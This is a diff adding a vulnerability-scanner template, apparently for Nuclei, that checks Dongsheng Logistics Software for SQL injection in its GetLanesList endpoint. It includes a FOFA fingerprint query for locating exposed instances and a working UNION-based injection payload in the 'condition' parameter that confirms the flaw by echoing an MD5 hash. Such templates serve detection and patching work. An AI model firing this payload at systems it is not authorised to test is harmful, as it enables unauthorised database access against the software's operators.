@@ -1,0 +1,32 @@
+id: poc-yaml-dongshengsoft-getlaneslist-sqli
+info:
+  name: Dongsheng Logistics Software GetLanesList SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: Dongsheng Logistics Software
+    fofa-query: app="Dongsheng Logistics Software-物流软件"
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: GET
+    path:
+      - "/MvcShipping/MsCodeAll/GetLanesList?condition=1=1+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--&sort=LANEID"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "\"Success\": true"
+          - "\"data\":"
+          - "\"GID\":"
+        condition: and
+      - type: word
+        words:
+          - "<"
+        negative: true
